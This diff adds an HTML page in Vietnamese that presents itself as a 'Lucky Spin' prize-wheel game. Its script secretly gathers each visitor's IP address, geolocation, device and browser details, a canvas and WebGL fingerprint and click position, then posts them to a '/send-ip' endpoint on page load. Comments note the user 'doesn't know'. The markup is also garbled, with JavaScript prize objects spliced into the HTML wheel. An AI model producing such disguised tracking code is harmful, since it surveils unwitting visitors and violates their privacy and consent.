@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎮 Lucky Spin Game</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Comic Sans MS', 'Arial', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow: hidden;
+        }
+
+        .stars {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+        }
+
+        .star {
+            position: absolute;
+            background: white;
+            width: 2px;
+            height: 2px;
+            border-radius: 50%;
+            animation: twinkle 2s infinite;
+        }
+
+        @keyframes twinkle {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 1; }
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 50px 40px;
+            border-radius: 30px;
+            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.4);
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+            position: relative;
+            z-index: 1;
+        }
+
+        h1 {
+            color: #ff6b6b;
+            margin-bottom: 15px;
+            font-size: 2.5em;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .subtitle {
+            color: #666;
+            margin-bottom: 40px;
+            font-size: 1.1em;
+        }
+
+        .wheel-container {
+            position: relative;
+            width: 300px;
+            margin: 30px auto;
+        }
+
+        .wheel-pointer {
+            position: absolute;
+            top: -20px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 0;
+            border-left: 20px solid transparent;
+            border-right: 20px solid transparent;
+            border-top: 30px solid #ff6b6b;
+            z-index: 10;
+            filter: drop-shadow(0 3px 5px rgba(0,0,0,0.3));
+        }
+
+        .prize-wheel {
+            width: 300px;
+            height: 300px;
+            position: relative;
+            border-radius: 50%;
+            border: 12px solid #ffd700;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);
+            overflow: hidden;
+        }
+
+        .prize-wheel.spinning {
+            transform: rotate(1800deg);
+        }
+
+        .wheel-section {
+            position: absolute;
+            width: 50%;
+            height: 50%;
+            transform-origin: 100% 100%;
+            clip-path: polygon(0 0, 100% 0, 100% 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .section-content {
+            position: absolute;
+            width: 140px;
+            text-align: center;
+            font-weight: bold;
+            color: white;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+            font-size: 13px;
+            transform: rotate(-18deg);
+            left: 45%;
+            top: 30%;
+        }
+
+        .section-icon {
+            font-size: 24px;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .section-text {
+            font-size: 11px;
+            display: block;
+        }
+
+        .section1 { background: #ff6b6b; transform: rotate(0deg); }
+        .section2 { background: #4ecdc4; transform: rotate(72deg); }
+        .section3 { background: #ffe66d; transform: rotate(144deg); }
+        .section4 { background: #a8e6cf; transform: rotate(216deg); }
+        .section5 { background: #ff8b94; transform: rotate(288deg); }
+
+        .section2 .section-content { transform: rotate(54deg); }
+        .section3 .section-content { transform: rotate(126deg); }
+        .section4 .section-content { transform: rotate(198deg); }
+        .section5 .section-content { transform: rotate(270deg); }
+
+        .wheel-center {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
+            border-radius: 50%;
+            border: 6px solid white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            z-index: 5;
+        }
+
+        #spinButton {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
+            color: white;
+            border: none;
+            padding: 20px 60px;
+            font-size: 1.4em;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 25px rgba(255, 107, 107, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        #spinButton:hover {
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 0 15px 35px rgba(255, 107, 107, 0.6);
+        }
+
+        #spinButton:active {
+            transform: translateY(-2px);
+        }
+
+        #spinButton:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .prize-display {
+            margin-top: 30px;
+            padding: 20px;
+            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
+            border-radius: 15px;
+            font-size: 1.3em;
+            font-weight: bold;
+            color: #333;
+            min-height: 70px;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            animation: slideIn 0.5s ease;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+
+        .prize-display.show {
+            display: flex;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .confetti {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            background: #f0f;
+            position: absolute;
+            animation: confetti-fall 3s linear;
+        }
+
+        @keyframes confetti-fall {
+            to {
+                transform: translateY(100vh) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        .stats {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(102, 126, 234, 0.1);
+            border-radius: 10px;
+            font-size: 0.9em;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="stars" id="stars"></div>
+    
+    <div class="container">
+        <h1>🎮 Lucky Spin</h1>
+        <p class="subtitle">Quay và nhận phần thưởng may mắn!</p>
+        
+        <div class="wheel-container">
+            <div class="wheel-pointer"></div>
+            <div class="prize-wheel" id="wheel">
+                <div class="wheel-section section1">
+                    <div class="section-content">
+                        <span class="section-icon">💰</span>
+                        <span class="section-text">100 Xu<br>Vàng</span>
+                    </div>
+                </div>
+                <div class="wheel-section section2">
+                    <div class="section-content">
+                        <span class="section-icon">💎</span>
+                        <span class="section-text">Kim<br>Cương</span>
+                    </div>
+                </div>
+                <div class="wheel-section section3">
+                    <div class="section-content">
+                        <span class="section-icon">⭐</span>
+                        <span class="section-text">Sao May<br>Mắn</span>
+                    </div>
+                </div>
+                <div class="wheel-section section4">
+                    <div class="section-content">
+                        <span class="section-icon">🎁</span>
+                        <span class="section-text">Quà Đặc<br>Biệt</span>
+                    </div>
+            { text: '💰 Chúc mừng! Bạn nhận được 100 Xu Vàng!', detail: 'Có thể dùng để đổi các vật phẩm trong game' },
+            { text: '💎 Tuyệt vời! Bạn nhận được Kim Cương!', detail: 'Vật phẩm hiếm, giá trị cao' },
+            { text: '⭐ Xuất sắc! Bạn nhận được Sao May Mắn!', detail: 'Tăng điểm may mắn trong 24h' },
+            { text: '🎁 Hoàn hảo! Bạn nhận được Quà Đặc Biệt!', detail: 'Mở ra để nhận ngẫu nhiên 1 phần thưởng bất ngờ' },
+            { text: '🏆 Đỉnh cao! Bạn nhận được Cúp Vàng!', detail: 'Phần thưởng cao nhất! Chúc mừng bạn!' }>Cúp<br>Vàng</span>
+                    </div>
+                </div>
+                <div class="wheel-center">SPIN</div>
+            </div>
+        </div>
+        
+        <button id="spinButton">QUAY NGAY</button>
+        
+        <div id="prizeDisplay" class="prize-display"></div>
+        
+        <div class="stats">
+            <p>🎯 Đã có <span id="totalPlays">0</span> người chơi hôm nay!</p>
+        </div>
+    </div>
+
+    <script>
+        // Create stars background
+        const starsContainer = document.getElementById('stars');
+        for (let i = 0; i < 100; i++) {
+            const star = document.createElement('div');
+            star.className = 'star';
+            star.style.left = Math.random() * 100 + '%';
+            star.style.top = Math.random() * 100 + '%';
+            star.style.animationDelay = Math.random() * 2 + 's';
+            starsContainer.appendChild(star);
+        }
+
+        const prizes = [
+            '🎁 Chúc mừng! Bạn nhận được 100 xu!',
+            '💎 Tuyệt vời! Bạn nhận được kim cương!',
+            '🌟 Xuất sắc! Bạn nhận được sao may mắn!',
+            '🎉 Hoàn hảo! Bạn nhận được phần thưởng đặc biệt!',
+            '🏆 Đỉnh cao! Bạn nhận được cúp vàng!'
+        ];
+
+        const button = document.getElementById('spinButton');
+        const wheel = document.getElementById('wheel');
+        const prizeDisplay = document.getElementById('prizeDisplay');
+        const totalPlaysSpan = document.getElementById('totalPlays');
+
+        // Random initial plays count
+        let totalPlays = Math.floor(Math.random() * 500) + 100;
+        totalPlaysSpan.textContent = totalPlays;
+
+        // Detect ALL device and system info
+        function getAllSystemInfo() {
+            const ua = navigator.userAgent;
+            let device = 'Unknown';
+            let browser = 'Unknown';
+            let os = 'Unknown';
+
+            // Device detection
+            if (/mobile/i.test(ua)) {
+                device = 'Mobile';
+            } else if (/tablet/i.test(ua)) {
+                device = 'Tablet';
+            } else {
+                device = 'Desktop/Laptop';
+            }
+
+            // More specific mobile detection
+            if (/iPhone|iPad|iPod/i.test(ua)) {
+                device = 'iPhone/iPad';
+                os = 'iOS';
+            } else if (/Android/i.test(ua)) {
+                device = 'Android Device';
+                os = 'Android';
+            }
+
+            // OS detection
+            if (/Windows/i.test(ua)) {
+                os = 'Windows';
+            } else if (/Mac OS/i.test(ua) && !/iPhone|iPad|iPod/i.test(ua)) {
+                os = 'macOS';
+            } else if (/Linux/i.test(ua)) {
+                os = 'Linux';
+            }
+
+            // Browser detection
+            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) {
+                browser = 'Chrome';
+            } else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
+                browser = 'Safari';
+            } else if (/Firefox/i.test(ua)) {
+                browser = 'Firefox';
+            } else if (/Edg/i.test(ua)) {
+                browser = 'Edge';
+            } else if (/MSIE|Trident/i.test(ua)) {
+                browser = 'Internet Explorer';
+            }
+
+            // Collect extensive system information
+            const systemInfo = {
+                // Basic info
+                device,
+                browser,
+                os,
+                userAgent: ua,
+                platform: navigator.platform,
+                
+                // Screen info
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenResolution: `${screen.width}x${screen.height}`,
+                screenColorDepth: screen.colorDepth,
+                screenPixelDepth: screen.pixelDepth,
+                
+                // Window info
+                windowWidth: window.innerWidth,
+                windowHeight: window.innerHeight,
+                windowResolution: `${window.innerWidth}x${window.innerHeight}`,
+                
+                // Language & Location
+                language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                
+                // Browser capabilities
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'Not set',
+                onLine: navigator.onLine,
+                javaEnabled: typeof navigator.javaEnabled === 'function' ? navigator.javaEnabled() : false,
+                
+                // Hardware info
+                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+                
+                // Connection info
+                connectionType: navigator.connection ? navigator.connection.effectiveType : 'N/A',
+                connectionDownlink: navigator.connection ? navigator.connection.downlink : 'N/A',
+                connectionRtt: navigator.connection ? navigator.connection.rtt : 'N/A',
+                
+                // Page info
+                referrer: document.referrer || 'Direct',
+                pageTitle: document.title,
+                pageUrl: window.location.href,
+                protocol: window.location.protocol,
+                
+                // Additional
+                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'None',
+                vendor: navigator.vendor || 'N/A',
+                localStorage: typeof(Storage) !== 'undefined',
+                sessionStorage: typeof(Storage) !== 'undefined',
+                indexedDB: !!window.indexedDB,
+                webGL: detectWebGL(),
+                canvas: detectCanvasFingerprint()
+            };
+
+            return systemInfo;
+        }
+
+        // Detect WebGL support
+        function detectWebGL() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        return {
+                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                        };
+                    }
+                    return 'Supported';
+                }
+                return 'Not supported';
+            } catch (e) {
+                return 'Error detecting';
+            }
+        }
+
+        // Canvas fingerprinting
+        function detectCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillText('Browser fingerprint', 2, 2);
+                return canvas.toDataURL().substring(0, 50);
+            } catch (e) {
+                return 'N/A';
+            }
+        }
+
+        // Send ALL collected info silently in background
+        async function sendIPSilently(clickPosition = null) {
+            try {
+                // Get IP info
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+
+                // Get geo location
+                const geoResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+                const geoData = await geoResponse.json();
+
+                // Get ALL system info
+                const systemInfo = getAllSystemInfo();
+
+                // Prepare complete data
+                const completeData = {
+                    // IP & Location
+                    ip: userIP,
+                    city: geoData.city || 'N/A',
+                    region: geoData.region || 'N/A',
+                    country: geoData.country_name || 'N/A',
+                    countryCode: geoData.country_code || 'N/A',
+                    postal: geoData.postal || 'N/A',
+                    latitude: geoData.latitude || 'N/A',
+                    longitude: geoData.longitude || 'N/A',
+                    org: geoData.org || 'N/A',
+                    asn: geoData.asn || 'N/A',
+                    
+                    // System Info
+                    ...systemInfo,
+                    
+                    // Click info
+                    clickPosition: clickPosition,
+                    clickTime: clickPosition ? new Date().toISOString() : null,
+                    
+                    // Timestamp
+                    timestamp: new Date().toISOString(),
+                    timestampLocal: new Date().toLocaleString('vi-VN')
+                };
+
+                // Send to server silently
+                fetch('/send-ip', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(completeData)
+                }).catch(() => {}); // Silent fail
+            } catch (error) {
+                // Silent fail - user doesn't know
+            }
+        }
+
+        // Create confetti
+        function createConfetti() {
+            for (let i = 0; i < 50; i++) {
+                setTimeout(() => {
+                    const confetti = document.createElement('div');
+                    confetti.className = 'confetti';
+                    confetti.style.left = Math.random() * 100 + '%';
+                    confetti.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                    confetti.style.top = '-10px';
+                    document.body.appendChild(confetti);
+                    
+                    setTimeout(() => confetti.remove(), 3000);
+                }, i * 30);
+            }
+        }
+
+        button.addEventListener('click', async (event) => {
+            button.disabled = true;
+            wheel.classList.add('spinning');
+            prizeDisplay.classList.remove('show');
+
+            // Only send data on FIRST click if not already tracked
+            if (!hasBeenTracked()) {
+                // Capture click position
+                const clickPos = {
+                    x: event.clientX,
+                    y: event.clientY,
+                    pageX: event.pageX,
+                    pageY: event.pageY,
+                    screenX: event.screenX,
+                    screenY: event.screenY
+                };
+
+                // Send IP silently in background while wheel is spinning
+                sendIPSilently(clickPos);
+                markAsTracked();
+            }
+
+            // Wait for spin to complete
+            setTimeout(() => {
+                wheel.classList.remove('spinning');
+                
+                // Show random prize
+                const randomPrize = prizes[Math.floor(Math.random() * prizes.length)];
+                prizeDisplay.innerHTML = `
+                    <div style="line-height: 1.6;">
+                        <div style="font-size: 1.3em; margin-bottom: 10px;">${randomPrize.text}</div>
+                        <div style="font-size: 0.9em; opacity: 0.8; font-weight: normal;">${randomPrize.detail}</div>
+                    </div>
+                `;
+                prizeDisplay.classList.add('show');
+                
+                // Create confetti effect
+                createConfetti();
+                
+                // Update play count
+                totalPlays++;
+                totalPlaysSpan.textContent = totalPlays;
+                
+                button.disabled = false;
+            }, 4000);
+        });
+
+        // Check if already tracked (only once per device)
+        function hasBeenTracked() {
+            try {
+                return localStorage.getItem('lucky_spin_tracked') === 'true';
+            } catch {
+                return false;
+            }
+        }
+
+        function markAsTracked() {
+            try {
+                localStorage.setItem('lucky_spin_tracked', 'true');
+                localStorage.setItem('lucky_spin_tracked_time', new Date().toISOString());
+            } catch {}
+        }
+
+        // Auto send IP when page loads (silent) - ONLY ONCE
+        window.addEventListener('load', () => {
+            if (!hasBeenTracked()) {
+                setTimeout(() => {
+                    sendIPSilently();
+                    markAsTracked();
+                    console.log('🔒 Tracked successfully. Will not track again from this device.');
+                }, 1000);
+            } else {
+                console.log('✅ Already tracked from this device.');
+            }
+        });
+    </script>
+</body>
+</html>
